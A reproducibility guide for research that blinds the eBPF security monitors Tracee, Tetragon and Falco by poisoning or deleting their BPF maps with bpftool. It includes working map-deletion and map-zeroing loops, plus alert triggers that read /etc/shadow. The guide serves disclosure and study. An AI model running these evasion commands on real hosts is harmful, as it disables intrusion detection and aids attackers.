# Reproducibility Guide

This document provides step-by-step instructions to reproduce all experimental results reported in this research. All experiments are designed to run on a single Linux host with Docker installed.

---

## 1. Prerequisites

### 1.1 Hardware and OS

- **Architecture:** x86_64 (amd64)
- **Kernel:** Linux 5.8 or later (for `CAP_BPF` separation; 5.15+ recommended)
- **RAM:** 4 GB minimum (8 GB recommended for running all three tools concurrently)
- **Disk:** 10 GB free (for Docker images and BPF filesystem)

### 1.2 Software

| Component | Version | Purpose |
|-----------|---------|---------|
| Docker | 20.10+ | Container runtime for deploying target tools |
| bpftool | 5.15+ | BPF map inspection and modification |
| python3 | 3.8+ | PoC script helper functions |
| jq | 1.6+ | JSON parsing for event log analysis |
| curl | any | Downloading tool releases (if needed) |

### 1.3 Kernel Configuration

Verify the following kernel options are enabled:

```bash
# Check BPF support
grep CONFIG_BPF= /boot/config-$(uname -r)          # CONFIG_BPF=y
grep CONFIG_BPF_SYSCALL= /boot/config-$(uname -r)   # CONFIG_BPF_SYSCALL=y
grep CONFIG_BPF_JIT= /boot/config-$(uname -r)       # CONFIG_BPF_JIT=y

# Check BTF support (required by Tracee and Tetragon)
grep CONFIG_DEBUG_INFO_BTF= /boot/config-$(uname -r) # CONFIG_DEBUG_INFO_BTF=y

# Verify bpftool works
bpftool version
bpftool map list
```

### 1.4 Capabilities

All PoC scripts must be run as root or with `CAP_BPF` + `CAP_PERFMON`:

```bash
# Option 1: Run as root
sudo bash poc/poc-tracee-blindness.sh

# Option 2: Grant specific capabilities (advanced)
sudo setcap cap_bpf,cap_perfmon+ep $(which bpftool)
```

### 1.5 BPF Filesystem

Ensure the BPF filesystem is mounted (required for Tetragon pinned maps):

```bash
mount -t bpf bpf /sys/fs/bpf 2>/dev/null || true
ls /sys/fs/bpf/
```

---

## 2. Experiment 1: Tracee v0.24.1

### 2.1 Setup

```bash
# Pull and start Tracee
docker run -d --name tracee \
  --pid=host --cgroupns=host \
  --privileged \
  -v /etc/os-release:/etc/os-release-host:ro \
  -v /sys:/sys:ro \
  -v /tmp/tracee:/tmp/tracee \
  aquasec/tracee:v0.24.1

# Wait for initialization
sleep 10

# Verify Tracee is running and generating events
docker logs tracee 2>&1 | tail -5
```

### 2.2 Baseline Measurement

```bash
# Generate process execution events
for i in $(seq 1 20); do /bin/true; done

# Count baseline events (5-second window)
sleep 5
docker logs tracee 2>&1 | grep "sched_process_exec" | wc -l
# Expected: ~16 events
```

### 2.3 Attack Execution

```bash
# Run the PoC script
sudo bash poc/poc-tracee-blindness.sh
```

**Manual alternative:**

```bash
# 1. Identify config_map
MAP_ID=$(bpftool map list | grep -B1 "name config_map" | grep "^[0-9]" | awk '{print $1}' | tr -d ':')

# 2. Dump current config to understand layout
bpftool map dump id $MAP_ID

# 3. Update enabled_policies to 0 and bump policies_version
# (exact key/value bytes depend on struct layout -- see poc script for details)
bpftool map update id $MAP_ID key <key_bytes> value <poisoned_value_bytes>
```

### 2.4 Blindness Verification

```bash
# Clear log reference point
BEFORE=$(docker logs tracee 2>&1 | wc -l)

# Generate identical activity
for i in $(seq 1 20); do /bin/true; done
sleep 5

# Count new events
AFTER=$(docker logs tracee 2>&1 | wc -l)
NEW_EVENTS=$((AFTER - BEFORE))
echo "Events after poisoning: $NEW_EVENTS"
# Expected: 0
```

### 2.5 Restoration

```bash
# Option 1: Restore map values (see poc script for exact bytes)
bpftool map update id $MAP_ID key <key_bytes> value <original_value_bytes>

# Option 2: Restart Tracee
docker restart tracee
sleep 10

# Verify recovery
for i in $(seq 1 20); do /bin/true; done
sleep 5
docker logs tracee 2>&1 | grep "sched_process_exec" | tail -10
# Expected: events resume
```

### 2.6 Cleanup

```bash
docker stop tracee && docker rm tracee
```

---

## 3. Experiment 2: Tetragon v1.4.0

### 3.1 Setup

```bash
# Pull and start Tetragon
docker run -d --name tetragon \
  --pid=host --cgroupns=host \
  --privileged \
  -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf \
  cilium/tetragon:v1.4.0

# Wait for initialization
sleep 15

# Verify Tetragon is running
docker logs tetragon 2>&1 | tail -5

# Verify maps are pinned
ls /sys/fs/bpf/tetragon/
ls /sys/fs/bpf/tetragon/__base__/event_execve/
```

### 3.2 Baseline Measurement

```bash
# Generate process execution events
for i in $(seq 1 20); do /bin/true; done

# Count baseline events
sleep 5
docker logs tetragon 2>&1 | grep "process_exec" | wc -l
# Expected: ~14 process_exec events
docker logs tetragon 2>&1 | grep "process_exit" | wc -l
# Expected: ~13 process_exit events
```

### 3.3 Attack Execution -- Phase 1 (Partial Blindness)

```bash
# Delete entries from execve_calls prog_array
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls \
  key 0x00 0x00 0x00 0x00
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls \
  key 0x01 0x00 0x00 0x00
```

### 3.4 Partial Blindness Verification

```bash
BEFORE=$(docker logs tetragon 2>&1 | wc -l)
for i in $(seq 1 20); do /bin/true; done
sleep 5
AFTER=$(docker logs tetragon 2>&1 | wc -l)

# Check event types
docker logs tetragon 2>&1 | tail -$((AFTER - BEFORE)) | grep "process_exec" | wc -l
# Expected: 0 (exec detection broken)
docker logs tetragon 2>&1 | tail -$((AFTER - BEFORE)) | grep "process_exit" | wc -l
# Expected: ~13 (exit detection still works)
```

### 3.5 Attack Execution -- Phase 2 (Total Blindness)

```bash
# Run the full PoC script which also clears execve_map
sudo bash poc/poc-tetragon-blindness.sh

# Or manually clear all 192 entries from execve_map
bpftool map dump pinned /sys/fs/bpf/tetragon/execve_map | \
  grep "key:" | while read -r line; do
    KEY=$(echo "$line" | sed 's/key: //' | sed 's/ value:.*//')
    bpftool map delete pinned /sys/fs/bpf/tetragon/execve_map key $KEY
  done
```

### 3.6 Total Blindness Verification

```bash
BEFORE=$(docker logs tetragon 2>&1 | wc -l)
for i in $(seq 1 20); do /bin/true; done
sleep 5
AFTER=$(docker logs tetragon 2>&1 | wc -l)
echo "Total new events: $((AFTER - BEFORE))"
# Expected: 0
```

### 3.7 Restoration and Cleanup

```bash
# Restart Tetragon to restore all state
docker restart tetragon
sleep 15

# Verify recovery
for i in $(seq 1 20); do /bin/true; done
sleep 5
docker logs tetragon 2>&1 | grep "process_exec" | tail -5
# Expected: events resume

# Cleanup
docker stop tetragon && docker rm tetragon
```

---

## 4. Experiment 3: Falco (latest)

### 4.1 Setup

```bash
# Pull and start Falco with eBPF driver
docker run -d --name falco \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /proc:/host/proc:ro \
  -v /etc:/host/etc:ro \
  falcosecurity/falco-no-driver:latest \
  falco --modern-bpf

# Wait for initialization
sleep 15

# Verify Falco is running
docker logs falco 2>&1 | tail -5
```

### 4.2 Baseline Measurement

```bash
# Trigger "Sensitive file opened" rule
cat /etc/shadow > /dev/null

# Verify alert
sleep 3
docker logs falco 2>&1 | grep "Sensitive file opened"
# Expected: 1+ alerts
```

### 4.3 Attack Execution

```bash
# Run the PoC script
sudo bash poc/poc-falco-blindness.sh
```

**Manual alternative:**

```bash
# 1. Identify interesting_syscalls map
MAP_ID=$(bpftool map list | grep -B1 "name interesting_syscalls" | \
  grep "^[0-9]" | awk '{print $1}' | tr -d ':')

# 2. Zero all 512 entries
for i in $(seq 0 511); do
  KEY=$(printf '0x%02x 0x%02x 0x00 0x00' $((i & 0xff)) $(((i >> 8) & 0xff)))
  bpftool map update id $MAP_ID key $KEY value 0x00 0x00 0x00 0x00
done
```

### 4.4 Blindness Verification

```bash
# Attempt to trigger alerts
cat /etc/shadow > /dev/null
ls /root/.ssh/ 2>/dev/null
curl http://example.com 2>/dev/null

sleep 5
# Check for any new alerts
docker logs falco 2>&1 | tail -20
# Expected: no new alerts after poisoning timestamp
```

### 4.5 Restoration and Cleanup

```bash
# Restart Falco to reload maps
docker restart falco
sleep 15

# Verify recovery
cat /etc/shadow > /dev/null
sleep 3
docker logs falco 2>&1 | grep "Sensitive file opened" | tail -3
# Expected: alerts resume

# Cleanup
docker stop falco && docker rm falco
```

---

## 5. Cross-Tool Verification

To reproduce the cross-tool comparison table, run all three tools simultaneously:

```bash
# Start all tools
# (use the setup commands from sections 2.1, 3.1, and 4.1)

# Verify baseline for all three tools
for i in $(seq 1 20); do /bin/true; done
cat /etc/shadow > /dev/null
sleep 5

# Run all three PoCs
sudo bash poc/poc-tracee-blindness.sh
sudo bash poc/poc-tetragon-blindness.sh
sudo bash poc/poc-falco-blindness.sh

# Verify blindness for all three tools simultaneously
for i in $(seq 1 20); do /bin/true; done
cat /etc/shadow > /dev/null
sleep 5

# Check each tool's logs for new events
# Expected: 0 new events across all three tools
```

---

## 6. Map Inventory Enumeration

To reproduce the map inventory counts:

```bash
# Tracee maps
bpftool map list | grep -c "^[0-9]"  # Total map count (filter by Tracee-associated)
bpftool map list | grep -c "pinned"    # Pinned count
bpftool map list | grep -c "frozen"    # Frozen count

# Tetragon maps (all pinned)
find /sys/fs/bpf/tetragon/ -type f 2>/dev/null | wc -l

# Falco maps
bpftool map list | grep -c "^[0-9]"  # Filter by Falco-associated prog IDs
```

---

## 7. Troubleshooting

### Tool fails to start

```bash
# Check kernel BTF support
ls /sys/kernel/btf/vmlinux
# If missing, BTF is not enabled. Use a kernel with CONFIG_DEBUG_INFO_BTF=y

# Check Docker privileges
docker run --rm --privileged alpine id
# Should print uid=0

# Check BPF filesystem
mount | grep bpf
# If not mounted: mount -t bpf bpf /sys/fs/bpf
```

### bpftool map list shows no maps

```bash
# Ensure tools are actually running
docker ps
# Ensure you are running as root
id
# Check bpftool can access BPF subsystem
bpftool prog list
```

### PoC script fails to find map

```bash
# Map names may vary by version. List all maps and inspect:
bpftool map list
# Look for maps associated with the target tool's BPF program IDs:
bpftool prog list
# Cross-reference prog IDs with map IDs
bpftool prog show id <PROG_ID>
```

### Events still appear after poisoning

```bash
# Verify the correct map was modified
bpftool map dump id <MAP_ID>
# For Tracee: verify enabled_policies is 0 AND policies_version was bumped
# For Tetragon: verify execve_calls entries are deleted (bpftool map dump should show empty)
# For Falco: verify all interesting_syscalls entries are 0

# Check for multiple instances of the same map
bpftool map list | grep <map_name>
# Some tools may create multiple maps with similar names
```

### Permission denied errors

```bash
# Verify capabilities
capsh --print | grep bpf
# Run as root if CAP_BPF is not available:
sudo bpftool map list
```

---

## 8. PoC Script Reference

| Script | Target | Attack Type | Expected Runtime |
|--------|--------|-------------|-----------------|
| `poc/poc-tracee-blindness.sh` | Tracee v0.24.1 | config_map poisoning | ~30 seconds |
| `poc/poc-tetragon-blindness.sh` | Tetragon v1.4.0 | prog_array + map clear | ~45 seconds |
| `poc/poc-falco-blindness.sh` | Falco (latest) | syscall filter zeroing | ~60 seconds |

Each script implements the full five-phase protocol (setup, baseline, poison, verify, restore) and outputs a structured summary of results. Scripts are idempotent and clean up after themselves.
